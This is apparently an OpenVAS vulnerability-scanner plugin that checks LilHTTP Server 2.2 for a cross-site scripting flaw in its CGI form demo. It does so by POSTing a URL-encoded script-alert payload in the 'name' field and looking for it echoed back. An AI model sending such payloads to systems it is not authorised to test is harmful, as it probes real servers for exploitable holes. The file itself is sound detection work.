###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_lilhttp_web_server_cgi_form_xss_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# LilHTTP Server 'CGI Form Demo' Cross Site Scripting Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attackers to plant XSS backdoors and
  inject arbitrary SQL statements via crafted XSS payloads.
  Impact Level: Application";
tag_affected = "LilHTTP Server version 2.2 and prior.";
tag_insight = "The flaw is caused by improper validation of user-supplied input, passed
  in the 'name' and 'email' parameter in 'cgitest.html', when handling the
  'CGI Form Demo' application.";
tag_solution = "No solution or patch is available as of 30th May, 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.summitcn.com/lilhttp/";
tag_summary = "The host is running LilHTTP Web Server and is prone to cross site
  scripting vulnerability";

if(description)
{
  script_id(902437);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-06-02 11:54:09 +0200 (Thu, 02 Jun 2011)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("Lil' HTTP Server Cross Site Scripting Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/101758/lilhttp-xss.txt");
  script_xref(name : "URL" , value : "http://www.securityhome.eu/exploits/exploit.php?eid=5477687364de02d6a4c2430.52315196");

  script_description(desc);
  script_summary("Check for XSS vulnerability in LilHTTP Web Server");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 SecPod");
  script_family("Web Servers");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");

## Get the default port
lilPort = get_http_port(default:80);
if(!lilPort){
  lilPort = 80;
}

## Check the port status
if(!get_port_state(lilPort)){
  exit(0);
}

## Get the HTTP banner and confirm the server
banner = get_http_banner(port:lilPort);
if("Server: LilHTTP" >!< banner){
  exit(0);
}

## Construct the POST data
postdata = "name=%3Cscript%3Ealert%28%27OpenVAS-XSS-TEST%27%29%3C%2F" +
           "script%3E&email=";

## Construct the POST request
req = string("POST /pbcgi.cgi HTTP/1.1\r\n",
             "Host: ", get_host_name(), "\r\n",
             "User-Agent:  XSS-TEST\r\n",
             "Content-Length: ", strlen(postdata), "\r\n",
             "\r\n", postdata);

res = http_send_recv(port:lilPort, data:req);

## Confirm the exploit
if("name=<script>alert('OpenVAS-XSS-TEST')</script>" >< res){
  security_warning(lilPort);
}
